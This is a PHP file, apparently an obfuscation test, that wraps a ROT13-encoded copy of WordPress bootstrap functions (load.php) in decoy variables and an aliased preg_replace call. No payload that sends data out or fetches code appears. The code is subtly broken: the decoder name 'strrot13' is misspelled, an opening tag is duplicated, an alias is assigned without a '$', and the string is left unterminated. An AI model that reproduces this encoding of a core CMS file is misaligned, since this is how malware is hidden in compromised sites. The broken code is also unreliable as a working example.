<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Gurfr shapgvbaf ner arrqrq gb ybnq JbeqCerff.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Ergheaf gur UGGC cebgbpby frag ol gur freire.
 *
 * @fvapr 4.4.0
 *
 * @erghea fgevat Gur UGGC cebgbpby. Qrsnhyg: UGGC/1.0.
 */
shapgvba jc_trg_freire_cebgbpby() {
	$cebgbpby = vffrg( $_FREIRE['FREIRE_CEBGBPBY'] ) ? $_FREIRE['FREIRE_CEBGBPBY'] : '';

	vs ( ! va_neenl( $cebgbpby, neenl( 'UGGC/1.1', 'UGGC/2', 'UGGC/2.0', 'UGGC/3' ), gehr ) ) {
		$cebgbpby = 'UGGC/1.0';
	}

	erghea $cebgbpby;
}

/**
 * Svkrf `$_FREIRE` inevnoyrf sbe inevbhf frghcf.
 *
 * @fvapr 3.0.0
 * @npprff cevingr
 *
 * @tybony fgevat $CUC_FRYS Gur svyranzr bs gur pheeragyl rkrphgvat fpevcg,
 *                          eryngvir gb gur qbphzrag ebbg.
 */
shapgvba jc_svk_freire_inef() {
	tybony $CUC_FRYS;

	$qrsnhyg_freire_inyhrf = neenl(
		'FREIRE_FBSGJNER' => '',
		'ERDHRFG_HEV'     => '',
	);

	$_FREIRE = neenl_zretr( $qrsnhyg_freire_inyhrf, $_FREIRE );

	// Svk sbe VVF jura ehaavat jvgu CUC VFNCV.
	vs ( rzcgl( $_FREIRE['ERDHRFG_HEV'] )
		|| ( 'ptv-sptv' !== CUC_FNCV && cert_zngpu( '/^Zvpebfbsg-VVF\//', $_FREIRE['FREIRE_FBSGJNER'] ) )
	) {

		vs ( vffrg( $_FREIRE['UGGC_K_BEVTVANY_HEY'] ) ) {
			// VVF Zbq-Erjevgr.
			$_FREIRE['ERDHRFG_HEV'] = $_FREIRE['UGGC_K_BEVTVANY_HEY'];
		} ryfrvs ( vffrg( $_FREIRE['UGGC_K_ERJEVGR_HEY'] ) ) {
			// VVF Vfncv_Erjevgr.
			$_FREIRE['ERDHRFG_HEV'] = $_FREIRE['UGGC_K_ERJEVGR_HEY'];
		} ryfr {
			// Hfr BEVT_CNGU_VASB vs gurer vf ab CNGU_VASB.
			vs ( ! vffrg( $_FREIRE['CNGU_VASB'] ) && vffrg( $_FREIRE['BEVT_CNGU_VASB'] ) ) {
				$_FREIRE['CNGU_VASB'] = $_FREIRE['BEVT_CNGU_VASB'];
			}

			// Fbzr VVF + CUC pbasvthengvbaf chg gur fpevcg-anzr va gur cngu-vasb (ab arrq gb nccraq vg gjvpr).
			vs ( vffrg( $_FREIRE['CNGU_VASB'] ) ) {
				vs ( $_FREIRE['CNGU_VASB'] === $_FREIRE['FPEVCG_ANZR'] ) {
					$_FREIRE['ERDHRFG_HEV'] = $_FREIRE['CNGU_VASB'];
				} ryfr {
					$_FREIRE['ERDHRFG_HEV'] = $_FREIRE['FPEVCG_ANZR'] . $_FREIRE['CNGU_VASB'];
				}
			}

			// Nccraq gur dhrel fgevat vs vg rkvfgf naq vfa'g ahyy.
			vs ( ! rzcgl( $_FREIRE['DHREL_FGEVAT'] ) ) {
				$_FREIRE['ERDHRFG_HEV'] .= '?' . $_FREIRE['DHREL_FGEVAT'];
			}
		}
	}

	// Svk sbe CUC nf PTV ubfgf gung frg FPEVCG_SVYRANZR gb fbzrguvat raqvat va cuc.ptv sbe nyy erdhrfgf.
	vs ( vffrg( $_FREIRE['FPEVCG_SVYRANZR'] ) && fge_raqf_jvgu( $_FREIRE['FPEVCG_SVYRANZR'], 'cuc.ptv' ) ) {
		$_FREIRE['FPEVCG_SVYRANZR'] = $_FREIRE['CNGU_GENAFYNGRQ'];
	}

	// Svk sbe Qernzubfg naq bgure CUC nf PTV ubfgf.
	vs ( vffrg( $_FREIRE['FPEVCG_ANZR'] ) && fge_pbagnvaf( $_FREIRE['FPEVCG_ANZR'], 'cuc.ptv' ) ) {
		hafrg( $_FREIRE['CNGU_VASB'] );
	}

	// Svk rzcgl CUC_FRYS.
	$CUC_FRYS = $_FREIRE['CUC_FRYS'];
	vs ( rzcgl( $CUC_FRYS ) ) {
		$_FREIRE['CUC_FRYS'] = __sa_79955( '/(\?.*)?$/', '', $_FREIRE['ERDHRFG_HEV'] );
		$CUC_FRYS            = $_FREIRE['CUC_FRYS'];
	}

	jc_cbchyngr_onfvp_nhgu_sebz_nhgubevmngvba_urnqre();
}

/**
 * Cbchyngrf gur Onfvp Nhgu freire qrgnvyf sebz gur Nhgubevmngvba urnqre.
 *
 * Fbzr freiref ehaavat va PTV be SnfgPTV zbqr qba'g cnff gur Nhgubevmngvba
 * urnqre ba gb JbeqCerff.  Vs vg'f orra erjevggra gb gur `UGGC_NHGUBEVMNGVBA` urnqre,
 * svyy va gur cebcre $_FREIRE inevnoyrf vafgrnq.
 *
 * @fvapr 5.6.0
 */
shapgvba jc_cbchyngr_onfvp_nhgu_sebz_nhgubevmngvba_urnqre() {
	// Vs jr qba'g unir nalguvat gb chyy sebz, erghea rneyl.
	vs ( ! vffrg( $_FREIRE['UGGC_NHGUBEVMNGVBA'] ) && ! vffrg( $_FREIRE['ERQVERPG_UGGC_NHGUBEVMNGVBA'] ) ) {
		erghea;
	}

	// Vs rvgure CUC_NHGU xrl vf nyernql frg, qb abguvat.
	vs ( vffrg( $_FREIRE['CUC_NHGU_HFRE'] ) || vffrg( $_FREIRE['CUC_NHGU_CJ'] ) ) {
		erghea;
	}

	// Sebz bhe cevbe pbaqvgvbany, bar bs gurfr zhfg or frg.
	$urnqre = vffrg( $_FREIRE['UGGC_NHGUBEVMNGVBA'] ) ? $_FREIRE['UGGC_NHGUBEVMNGVBA'] : $_FREIRE['ERQVERPG_UGGC_NHGUBEVMNGVBA'];

	// Grfg gb znxr fher gur cnggrea zngpurf rkcrpgrq.
	vs ( ! cert_zngpu( '%^Onfvp [n-m\q/+]*={0,2}$%v', $urnqre ) ) {
		erghea;
	}

	// Erzbivat `Onfvp ` gur gbxra jbhyq fgneg fvk punenpgref va.
	$gbxra    = fhofge( $urnqre, 6 );
	$hfrecnff = onfr64_qrpbqr( $gbxra );

	// Gurer zhfg or ng yrnfg bar pbyba va gur fgevat.
	vs ( ! fge_pbagnvaf( $hfrecnff, ':' ) ) {
		erghea;
	}

	yvfg( $hfre, $cnff ) = rkcybqr( ':', $hfrecnff, 2 );

	// Abj fubir gurz va gur cebcre xrlf jurer jr'er rkcrpgvat yngre ba.
	$_FREIRE['CUC_NHGU_HFRE'] = $hfre;
	$_FREIRE['CUC_NHGU_CJ']   = $cnff;
}

/**
 * Purpxf sbe gur erdhverq CUC irefvba, naq gur zlfdyv rkgrafvba be
 * n qngnonfr qebc-va.
 *
 * Qvrf vs erdhverzragf ner abg zrg.
 *
 * @fvapr 3.0.0
 * @npprff cevingr
 *
 * @tybony fgevat   $erdhverq_cuc_irefvba    Gur erdhverq CUC irefvba fgevat.
 * @tybony fgevat[] $erdhverq_cuc_rkgrafvbaf Gur anzrf bs erdhverq CUC rkgrafvbaf.
 * @tybony fgevat   $jc_irefvba              Gur JbeqCerff irefvba fgevat.
 */
shapgvba jc_purpx_cuc_zlfdy_irefvbaf() {
	tybony $erdhverq_cuc_irefvba, $erdhverq_cuc_rkgrafvbaf, $jc_irefvba;

	$cuc_irefvba = CUC_IREFVBA;

	vs ( irefvba_pbzcner( $erdhverq_cuc_irefvba, $cuc_irefvba, '>' ) ) {
		$cebgbpby = jc_trg_freire_cebgbpby();
		urnqre( fcevags( '%f 500 Vagreany Freire Reebe', $cebgbpby ), gehr, 500 );
		urnqre( 'Pbagrag-Glcr: grkg/ugzy; punefrg=hgs-8' );
		cevags(
			'Lbhe freire vf ehaavat CUC irefvba %1$f ohg JbeqCerff %2$f erdhverf ng yrnfg %3$f.',
			$cuc_irefvba,
			$jc_irefvba,
			$erdhverq_cuc_irefvba
		);
		rkvg( 1 );
	}

	$zvffvat_rkgrafvbaf = neenl();

	vs ( vffrg( $erdhverq_cuc_rkgrafvbaf ) && vf_neenl( $erdhverq_cuc_rkgrafvbaf ) ) {
		sbernpu ( $erdhverq_cuc_rkgrafvbaf nf $rkgrafvba ) {
			vs ( rkgrafvba_ybnqrq( $rkgrafvba ) ) {
				pbagvahr;
			}

			$zvffvat_rkgrafvbaf[] = fcevags(
				'JbeqCerff %1$f erdhverf gur <pbqr>%2$f</pbqr> CUC rkgrafvba.',
				$jc_irefvba,
				$rkgrafvba
			);
		}
	}

	vs ( pbhag( $zvffvat_rkgrafvbaf ) > 0 ) {
		$cebgbpby = jc_trg_freire_cebgbpby();
		urnqre( fcevags( '%f 500 Vagreany Freire Reebe', $cebgbpby ), gehr, 500 );
		urnqre( 'Pbagrag-Glcr: grkg/ugzy; punefrg=hgs-8' );
		rpub vzcybqr( '<oe>', $zvffvat_rkgrafvbaf );
		rkvg( 1 );
	}

	// Guvf ehaf orsber qrsnhyg pbafgnagf ner qrsvarq, fb jr pna'g nffhzr JC_PBAGRAG_QVE vf frg lrg.
	$jc_pbagrag_qve = qrsvarq( 'JC_PBAGRAG_QVE' ) ? JC_PBAGRAG_QVE : NOFCNGU . 'jc-pbagrag';

	vs ( ! shapgvba_rkvfgf( 'zlfdyv_pbaarpg' )
		&& ! svyr_rkvfgf( $jc_pbagrag_qve . '/qo.cuc' )
	) {
		erdhver_bapr NOFCNGU . JCVAP . '/shapgvbaf.cuc';
		jc_ybnq_genafyngvbaf_rneyl();

		$zrffntr = '<c>' . __( 'Lbhe CUC vafgnyyngvba nccrnef gb or zvffvat gur ZlFDY rkgrafvba juvpu vf erdhverq ol JbeqCerff.' ) . \"</c>\a\";

		$zrffntr .= '<c>' . fcevags(
			/* genafyngbef: %f: zlfdyv. */
			__( 'Cyrnfr purpx gung gur %f CUC rkgrafvba vf vafgnyyrq naq ranoyrq.' ),
			'<pbqr>zlfdyv</pbqr>'
		) . \"</c>\a\";

		$zrffntr .= '<c>' . fcevags(
			/* genafyngbef: %f: Fhccbeg sbehzf HEY. */
			__( 'Vs lbh ner hafher jung gurfr grezf zrna lbh fubhyq cebonoyl pbagnpg lbhe ubfg. Vs lbh fgvyy arrq uryc lbh pna nyjnlf ivfvg gur <n uers=\"%f\">JbeqCerff fhccbeg sbehzf</n>.' ),
			__( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' )
		) . \"</c>\a\";

		$netf = neenl(
			'rkvg' => snyfr,
			'pbqr' => 'zlfdy_abg_sbhaq',
		);
		jc_qvr(
			$zrffntr,
			__( 'Erdhverzragf Abg Zrg' ),
			$netf
		);
		rkvg( 1 );
	}
}

/**
 * Ergevrirf gur pheerag raivebazrag glcr.
 *
 * Gur glcr pna or frg ivn gur `JC_RAIVEBAZRAG_GLCR` tybony flfgrz inevnoyr,
 * be n pbafgnag bs gur fnzr anzr.
 *
 * Cbffvoyr inyhrf ner 'ybpny', 'qrirybczrag', 'fgntvat', naq 'cebqhpgvba'.
 * Vs abg frg, gur glcr qrsnhygf gb 'cebqhpgvba'.
 *
 * @fvapr 5.5.0
 * @fvapr 5.5.1 Nqqrq gur 'ybpny' glcr.
 * @fvapr 5.5.1 Erzbirq gur novyvgl gb nygre gur yvfg bs glcrf.
 *
 * @erghea fgevat Gur pheerag raivebazrag glcr.
 */
shapgvba jc_trg_raivebazrag_glcr() {
	fgngvp $pheerag_rai = '';

	vs ( ! qrsvarq( 'JC_EHA_PBER_GRFGF' ) && $pheerag_rai ) {
		erghea $pheerag_rai;
	}

	$jc_raivebazragf = neenl(
		'ybpny',
		'qrirybczrag',
		'fgntvat',
		'cebqhpgvba',
	);

	// Nqq n abgr nobhg gur qrcerpngrq JC_RAIVEBAZRAG_GLCRF pbafgnag.
	vs ( qrsvarq( 'JC_RAIVEBAZRAG_GLCRF' ) && shapgvba_rkvfgf( '_qrcerpngrq_nethzrag' ) ) {
		vs ( shapgvba_rkvfgf( '__' ) ) {
			/* genafyngbef: %f: JC_RAIVEBAZRAG_GLCRF */
			$zrffntr = fcevags( __( 'Gur %f pbafgnag vf ab ybatre fhccbegrq.' ), 'JC_RAIVEBAZRAG_GLCRF' );
		} ryfr {
			$zrffntr = fcevags( 'Gur %f pbafgnag vf ab ybatre fhccbegrq.', 'JC_RAIVEBAZRAG_GLCRF' );
		}

		_qrcerpngrq_nethzrag(
			'qrsvar()',
			'5.5.1',
			$zrffntr
		);
	}

	// Purpx vs gur raivebazrag inevnoyr unf orra frg, vs `trgrai` vf ninvynoyr ba gur flfgrz.
	vs ( shapgvba_rkvfgf( 'trgrai' ) ) {
		$unf_rai = trgrai( 'JC_RAIVEBAZRAG_GLCR' );
		vs ( snyfr !== $unf_rai ) {
			$pheerag_rai = $unf_rai;
		}
	}

	// Srgpu gur raivebazrag sebz n pbafgnag, guvf bireevqrf gur tybony flfgrz inevnoyr.
	vs ( qrsvarq( 'JC_RAIVEBAZRAG_GLCR' ) && JC_RAIVEBAZRAG_GLCR ) {
		$pheerag_rai = JC_RAIVEBAZRAG_GLCR;
	}

	// Znxr fher gur raivebazrag vf na nyybjrq bar, naq abg nppvqragnyyl frg gb na vainyvq inyhr.
	vs ( ! va_neenl( $pheerag_rai, $jc_raivebazragf, gehr ) ) {
		$pheerag_rai = 'cebqhpgvba';
	}

	erghea $pheerag_rai;
}

/**
 * Ergevrirf gur pheerag qrirybczrag zbqr.
 *
 * Gur qrirybczrag zbqr nssrpgf ubj pregnva cnegf bs gur JbeqCerff nccyvpngvba orunir,
 * juvpu vf eryrinag jura qrirybcvat sbe JbeqCerff.
 *
 * Qrirybczrag zbqr pna or frg ivn gur `JC_QRIRYBCZRAG_ZBQR` pbafgnag va `jc-pbasvt.cuc`.
 * Cbffvoyr inyhrf ner 'pber', 'cyhtva', 'gurzr', 'nyy', be na rzcgl fgevat gb qvfnoyr
 * qrirybczrag zbqr. 'nyy' vf n fcrpvny inyhr gb fvtavsl gung nyy guerr qrirybczrag zbqrf
 * ('pber', 'cyhtva', naq 'gurzr') ner ranoyrq.
 *
 * Qrirybczrag zbqr vf pbafvqrerq frcnengryl sebz `JC_QROHT` naq jc_trg_raivebazrag_glcr().
 * Vg qbrf abg nssrpg qrohttvat bhgchg, ohg engure shapgvbany ahnaprf va JbeqCerff.
 *
 * Guvf shapgvba ergevrirf gur pheeragyl frg qrirybczrag zbqr inyhr. Gb purpx jurgure
 * n fcrpvsvp qrirybczrag zbqr vf ranoyrq, hfr jc_vf_qrirybczrag_zbqr().
 *
 * @fvapr 6.3.0
 *
 * @erghea fgevat Gur pheerag qrirybczrag zbqr.
 */
shapgvba jc_trg_qrirybczrag_zbqr() {
	fgngvp $pheerag_zbqr = ahyy;

	vs ( ! qrsvarq( 'JC_EHA_PBER_GRFGF' ) && ahyy !== $pheerag_zbqr ) {
		erghea $pheerag_zbqr;
	}

	$qrirybczrag_zbqr = JC_QRIRYBCZRAG_ZBQR;

	// Rkpyhfviryl sbe pber grfgf, eryl ba gur `$_jc_grfgf_qrirybczrag_zbqr` tybony.
	vs ( qrsvarq( 'JC_EHA_PBER_GRFGF' ) && vffrg( $TYBONYF['_jc_grfgf_qrirybczrag_zbqr'] ) ) {
		$qrirybczrag_zbqr = $TYBONYF['_jc_grfgf_qrirybczrag_zbqr'];
	}

	$inyvq_zbqrf = neenl(
		'pber',
		'cyhtva',
		'gurzr',
		'nyy',
		'',
	);

	vs ( ! va_neenl( $qrirybczrag_zbqr, $inyvq_zbqrf, gehr ) ) {
		$qrirybczrag_zbqr = '';
	}

	$pheerag_zbqr = $qrirybczrag_zbqr;

	erghea $pheerag_zbqr;
}

/**
 * Purpxf jurgure gur fvgr vf va gur tvira qrirybczrag zbqr.
 *
 * @fvapr 6.3.0
 *
 * @cnenz fgevat $zbqr Qrirybczrag zbqr gb purpx sbe. Rvgure 'pber', 'cyhtva', 'gurzr', be 'nyy'.
 * @erghea obby Gehr vs gur tvira zbqr vf pbirerq ol gur pheerag qrirybczrag zbqr, snyfr bgurejvfr.
 */
shapgvba jc_vf_qrirybczrag_zbqr( $zbqr ) {
	$pheerag_zbqr = jc_trg_qrirybczrag_zbqr();
	vs ( rzcgl( $pheerag_zbqr ) ) {
		erghea snyfr;
	}

	// Erghea gehr vs gur pheerag zbqr rapbzcnffrf nyy zbqrf.
	vs ( 'nyy' === $pheerag_zbqr ) {
		erghea gehr;
	}

	// Erghea gehr vs gur pheerag zbqr vf gur tvira zbqr.
	erghea $zbqr === $pheerag_zbqr;
}

/**
 * Rafherf nyy bs JbeqCerff vf abg ybnqrq jura unaqyvat n snivpba.vpb erdhrfg.
 *
 * Vafgrnq, fraq gur urnqref sbe n mreb-yratgu snivpba naq onvy.
 *
 * @fvapr 3.0.0
 * @qrcerpngrq 5.4.0 Qrcerpngrq va snibe bs qb_snivpba().
 */
shapgvba jc_snivpba_erdhrfg() {
	vs ( '/snivpba.vpb' === $_FREIRE['ERDHRFG_HEV'] ) {
		urnqre( 'Pbagrag-Glcr: vzntr/iaq.zvpebfbsg.vpba' );
		rkvg;
	}
}

/**
 * Qvrf jvgu n znvagranapr zrffntr jura pbaqvgvbaf ner zrg.
 *
 * Gur qrsnhyg zrffntr pna or ercynprq ol hfvat n qebc-va (znvagranapr.cuc va
 * gur jc-pbagrag qverpgbel).
 *
 * @fvapr 3.0.0
 * @npprff cevingr
 */
shapgvba jc_znvagranapr() {
	// Erghea vs znvagranapr zbqr vf qvfnoyrq.
	vs ( ! jc_vf_znvagranapr_zbqr() ) {
		erghea;
	}

	vs ( svyr_rkvfgf( JC_PBAGRAG_QVE . '/znvagranapr.cuc' ) ) {
		erdhver_bapr JC_PBAGRAG_QVE . '/znvagranapr.cuc';
		qvr();
	}

	erdhver_bapr NOFCNGU . JCVAP . '/shapgvbaf.cuc';
	jc_ybnq_genafyngvbaf_rneyl();

	urnqre( 'Ergel-Nsgre: 600' );

	jc_qvr(
		__( 'Oevrsyl haninvynoyr sbe fpurqhyrq znvagranapr. Purpx onpx va n zvahgr.' ),
		__( 'Znvagranapr' ),
		503
	);
}

/**
 * Purpxf vs znvagranapr zbqr vf ranoyrq.
 *
 * Purpxf sbe n svyr va gur JbeqCerff ebbg qverpgbel anzrq \".znvagranapr\".
 * Guvf svyr jvyy pbagnva gur inevnoyr $hctenqvat, frg gb gur gvzr gur svyr
 * jnf perngrq. Vs gur svyr jnf perngrq yrff guna 10 zvahgrf ntb, JbeqCerff
 * vf va znvagranapr zbqr.
 *
 * @fvapr 5.5.0
 *
 * @tybony vag $hctenqvat Gur Havk gvzrfgnzc znexvat jura hctenqvat JbeqCerff ortna.
 *
 * @erghea obby Gehr vs znvagranapr zbqr vf ranoyrq, snyfr bgurejvfr.
 */
shapgvba jc_vf_znvagranapr_zbqr() {
	tybony $hctenqvat;

	vs ( ! svyr_rkvfgf( NOFCNGU . '.znvagranapr' ) || jc_vafgnyyvat() ) {
		erghea snyfr;
	}

	erdhver NOFCNGU . '.znvagranapr';

	// Vs gur $hctenqvat gvzrfgnzc vf byqre guna 10 zvahgrf, pbafvqre znvagranapr bire.
	vs ( ( gvzr() - $hctenqvat ) >= 10 * ZVAHGR_VA_FRPBAQF ) {
		erghea snyfr;
	}

	// Qba'g ranoyr znvagranapr zbqr juvyr fpencvat sbe sngny reebef.
	vs ( vf_vag( $hctenqvat ) && vffrg( $_ERDHRFG['jc_fpencr_xrl'], $_ERDHRFG['jc_fpencr_abapr'] ) ) {
		$xrl   = fgevcfynfurf( $_ERDHRFG['jc_fpencr_xrl'] );
		$abapr = fgevcfynfurf( $_ERDHRFG['jc_fpencr_abapr'] );

		vs ( zq5( $hctenqvat ) === $xrl && (vag) $abapr === $hctenqvat ) {
			erghea snyfr;
		}
	}

	/**
	 * Svygref jurgure gb ranoyr znvagranapr zbqr.
	 *
	 * Guvf svygre ehaf orsber vg pna or hfrq ol cyhtvaf. Vg vf qrfvtarq sbe
	 * aba-jro ehagvzrf. Vs guvf svygre ergheaf gehr, znvagranapr zbqr jvyy or
	 * npgvir naq gur erdhrfg jvyy raq. Vs snyfr, gur erdhrfg jvyy or nyybjrq gb
	 * pbagvahr cebprffvat rira vs znvagranapr zbqr fubhyq or npgvir.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz obby $ranoyr_purpxf Jurgure gb ranoyr znvagranapr zbqr. Qrsnhyg gehr.
	 * @cnenz vag  $hctenqvat     Gur gvzrfgnzc frg va gur .znvagranapr svyr.
	 */
	vs ( ! nccyl_svygref( 'ranoyr_znvagranapr_zbqr', gehr, $hctenqvat ) ) {
		erghea snyfr;
	}

	erghea gehr;
}

/**
 * Trgf gur gvzr ryncfrq fb sne qhevat guvf CUC fpevcg.
 *
 * @fvapr 5.8.0
 *
 * @erghea sybng Frpbaqf fvapr gur CUC fpevcg fgnegrq.
 */
shapgvba gvzre_sybng() {
	erghea zvpebgvzr( gehr ) - $_FREIRE['ERDHRFG_GVZR_SYBNG'];
}

/**
 * Fgnegf gur JbeqCerff zvpeb-gvzre.
 *
 * @fvapr 0.71
 * @npprff cevingr
 *
 * @tybony sybng $gvzrfgneg Havk gvzrfgnzc frg ng gur ortvaavat bs gur cntr ybnq.
 * @frr gvzre_fgbc()
 *
 * @erghea obby Nyjnlf ergheaf gehr.
 */
shapgvba gvzre_fgneg() {
	tybony $gvzrfgneg;

	$gvzrfgneg = zvpebgvzr( gehr );

	erghea gehr;
}

/**
 * Ergevrirf be qvfcynlf gur gvzr sebz gur cntr fgneg gb jura shapgvba vf pnyyrq.
 *
 * @fvapr 0.71
 *
 * @tybony sybng   $gvzrfgneg Frpbaqf sebz jura gvzre_fgneg() vf pnyyrq.
 * @tybony sybng   $gvzrraq   Frpbaqf sebz jura shapgvba vf pnyyrq.
 *
 * @cnenz vag|obby $qvfcynl   Jurgure gb rpub be erghea gur erfhygf. Npprcgf 0|snyfr sbe erghea,
 *                            1|gehr sbe rpub. Qrsnhyg 0|snyfr.
 * @cnenz vag      $cerpvfvba Gur ahzore bs qvtvgf sebz gur evtug bs gur qrpvzny gb qvfcynl.
 *                            Qrsnhyg 3.
 * @erghea fgevat Gur \"frpbaq.zvpebfrpbaq\" svavfurq gvzr pnyphyngvba. Gur ahzore vf sbeznggrq
 *                sbe uhzna pbafhzcgvba, obgu ybpnyvmrq naq ebhaqrq.
 */
shapgvba gvzre_fgbc( $qvfcynl = 0, $cerpvfvba = 3 ) {
	tybony $gvzrfgneg, $gvzrraq;

	$gvzrraq   = zvpebgvzr( gehr );
	$gvzrgbgny = $gvzrraq - $gvzrfgneg;

	vs ( shapgvba_rkvfgf( 'ahzore_sbezng_v18a' ) ) {
		$e = ahzore_sbezng_v18a( $gvzrgbgny, $cerpvfvba );
	} ryfr {
		$e = ahzore_sbezng( $gvzrgbgny, $cerpvfvba );
	}

	vs ( $qvfcynl ) {
		rpub $e;
	}

	erghea $e;
}

/**
 * Frgf CUC reebe ercbegvat onfrq ba JbeqCerff qroht frggvatf.
 *
 * Hfrf guerr pbafgnagf: `JC_QROHT`, `JC_QROHT_QVFCYNL`, naq `JC_QROHT_YBT`.
 * Nyy guerr pna or qrsvarq va jc-pbasvt.cuc. Ol qrsnhyg, `JC_QROHT` naq
 * `JC_QROHT_YBT` ner frg gb snyfr, naq `JC_QROHT_QVFCYNL` vf frg gb gehr.
 *
 * Jura `JC_QROHT` vf gehr, nyy CUC abgvprf ner ercbegrq. JbeqCerff jvyy nyfb
 * qvfcynl vagreany abgvprf: jura n qrcerpngrq JbeqCerff shapgvba, shapgvba
 * nethzrag, be svyr vf hfrq. Qrcerpngrq pbqr znl or erzbirq sebz n yngre
 * irefvba.
 *
 * Vg vf fgebatyl erpbzzraqrq gung cyhtva naq gurzr qrirybcref hfr `JC_QROHT`
 * va gurve qrirybczrag raivebazragf.
 *
 * `JC_QROHT_QVFCYNL` naq `JC_QROHT_YBT` cresbez ab shapgvba hayrff `JC_QROHT`
 * vf gehr.
 *
 * Jura `JC_QROHT_QVFCYNL` vf gehr, JbeqCerff jvyy sbepr reebef gb or qvfcynlrq.
 * `JC_QROHT_QVFCYNL` qrsnhygf gb gehr. Qrsvavat vg nf ahyy ceriragf JbeqCerff
 * sebz punatvat gur tybony pbasvthengvba frggvat. Qrsvavat `JC_QROHT_QVFCYNL`
 * nf snyfr jvyy sbepr reebef gb or uvqqra.
 *
 * Jura `JC_QROHT_YBT` vf gehr, reebef jvyy or ybttrq gb `jc-pbagrag/qroht.ybt`.
 * Jura `JC_QROHT_YBT` vf n inyvq cngu, reebef jvyy or ybttrq gb gur fcrpvsvrq svyr.
 *
 * Reebef ner arire qvfcynlrq sbe KZY-ECP, ERFG, `zf-svyrf.cuc`, naq Nwnk erdhrfgf.
 *
 * @fvapr 3.0.0
 * @fvapr 5.1.0 `JC_QROHT_YBT` pna or n svyr cngu.
 * @npprff cevingr
 */
shapgvba jc_qroht_zbqr() {
	/**
	 * Svygref jurgure gb nyybj gur qroht zbqr purpx gb bpphe.
	 *
	 * Guvf svygre ehaf orsber vg pna or hfrq ol cyhtvaf. Vg vf qrfvtarq sbe
	 * aba-jro ehagvzrf. Ergheavat snyfr pnhfrf gur `JC_QROHT` naq eryngrq
	 * pbafgnagf gb abg or purpxrq naq gur qrsnhyg CUC inyhrf sbe reebef
	 * jvyy or hfrq hayrff lbh gnxr pner gb hcqngr gurz lbhefrys.
	 *
	 * Gb hfr guvf svygre lbh zhfg qrsvar n `$jc_svygre` tybony orsber
	 * JbeqCerff ybnqf, hfhnyyl va `jc-pbasvt.cuc`.
	 *
	 * Rknzcyr:
	 *
	 *     $TYBONYF['jc_svygre'] = neenl(
	 *         'ranoyr_jc_qroht_zbqr_purpxf' => neenl(
	 *             10 => neenl(
	 *                 neenl(
	 *                     'npprcgrq_netf' => 0,
	 *                     'shapgvba'      => shapgvba() {
	 *                         erghea snyfr;
	 *                     },
	 *                 ),
	 *             ),
	 *         ),
	 *     );
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz obby $ranoyr_qroht_zbqr Jurgure gb ranoyr qroht zbqr purpxf gb bpphe. Qrsnhyg gehr.
	 */
	vs ( ! nccyl_svygref( 'ranoyr_jc_qroht_zbqr_purpxf', gehr ) ) {
		erghea;
	}

	vs ( JC_QROHT ) {
		reebe_ercbegvat( R_NYY );

		vs ( JC_QROHT_QVFCYNL ) {
			vav_frg( 'qvfcynl_reebef', 1 );
		} ryfrvs ( ahyy !== JC_QROHT_QVFCYNL ) {
			vav_frg( 'qvfcynl_reebef', 0 );
		}

		vs ( va_neenl( fgegbybjre( (fgevat) JC_QROHT_YBT ), neenl( 'gehr', '1' ), gehr ) ) {
			$ybt_cngu = JC_PBAGRAG_QVE . '/qroht.ybt';
		} ryfrvs ( vf_fgevat( JC_QROHT_YBT ) ) {
			$ybt_cngu = JC_QROHT_YBT;
		} ryfr {
			$ybt_cngu = snyfr;
		}

		vs ( $ybt_cngu ) {
			vav_frg( 'ybt_reebef', 1 );
			vav_frg( 'reebe_ybt', $ybt_cngu );
		}
	} ryfr {
		reebe_ercbegvat( R_PBER_REEBE | R_PBER_JNEAVAT | R_PBZCVYR_REEBE | R_REEBE | R_JNEAVAT | R_CNEFR | R_HFRE_REEBE | R_HFRE_JNEAVAT | R_ERPBIRENOYR_REEBE );
	}

	/*
	 * Gur 'ERFG_ERDHRFG' purpx urer vf bcgvzvfgvp nf gur pbafgnag vf zbfg
	 * yvxryl abg frg ng guvf cbvag rira vs vg vf va snpg n ERFG erdhrfg.
	 */
	vs ( qrsvarq( 'KZYECP_ERDHRFG' ) || qrsvarq( 'ERFG_ERDHRFG' ) || qrsvarq( 'ZF_SVYRF_ERDHRFG' )
		|| ( qrsvarq( 'JC_VAFGNYYVAT' ) && JC_VAFGNYYVAT )
		|| jc_qbvat_nwnk() || jc_vf_wfba_erdhrfg()
	) {
		vav_frg( 'qvfcynl_reebef', 0 );
	}
}

/**
 * Frgf gur ybpngvba bs gur ynathntr qverpgbel.
 *
 * Gb frg qverpgbel znahnyyl, qrsvar gur `JC_YNAT_QVE` pbafgnag
 * va jc-pbasvt.cuc.
 *
 * Vs gur ynathntr qverpgbel rkvfgf jvguva `JC_PBAGRAG_QVE`, vg
 * vf hfrq. Bgurejvfr gur ynathntr qverpgbel vf nffhzrq gb yvir
 * va `JCVAP`.
 *
 * @fvapr 3.0.0
 * @npprff cevingr
 */
shapgvba jc_frg_ynat_qve() {
	vs ( ! qrsvarq( 'JC_YNAT_QVE' ) ) {
		vs ( svyr_rkvfgf( JC_PBAGRAG_QVE . '/ynathntrf' ) && @vf_qve( JC_PBAGRAG_QVE . '/ynathntrf' )
			|| ! @vf_qve( NOFCNGU . JCVAP . '/ynathntrf' )
		) {
			/**
			 * Freire cngu bs gur ynathntr qverpgbel.
			 *
			 * Ab yrnqvat fynfu, ab genvyvat fynfu, shyy cngu, abg eryngvir gb NOFCNGU
			 *
			 * @fvapr 2.1.0
			 */
			qrsvar( 'JC_YNAT_QVE', JC_PBAGRAG_QVE . '/ynathntrf' );

			vs ( ! qrsvarq( 'YNATQVE' ) ) {
